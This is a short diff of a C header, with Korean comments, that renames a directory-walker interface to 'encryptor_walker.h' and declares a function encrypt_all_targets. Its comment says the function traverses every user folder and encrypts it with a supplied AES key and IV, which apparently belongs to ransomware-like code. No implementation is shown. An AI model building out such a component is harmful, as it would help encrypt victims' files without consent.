@@ -1,9 +1,16 @@
-// walker.h - 디렉토리 재귀 순회 함수 헤더
-// EVP 방식 AES 암호화를 위해 key, iv는 unsigned char* 사용
+// encryptor_walker.h
+#ifndef ENCRYPTOR_WALKER_H
+#define ENCRYPTOR_WALKER_H
 
-#ifndef WALKER_H
-#define WALKER_H
+#ifdef __cplusplus
+extern "C" {
+#endif
 
-void scan_directory(const char* dir, const unsigned char* key, const unsigned char* iv);
+	// 전체 사용자 폴더를 순회하며 암호화 수행
+	void encrypt_all_targets(const unsigned char* key, const unsigned char* iv);
 
-#endif // WALKER_H
+#ifdef __cplusplus
+}
+#endif
+
+#endif // ENCRYPTOR_WALKER_H
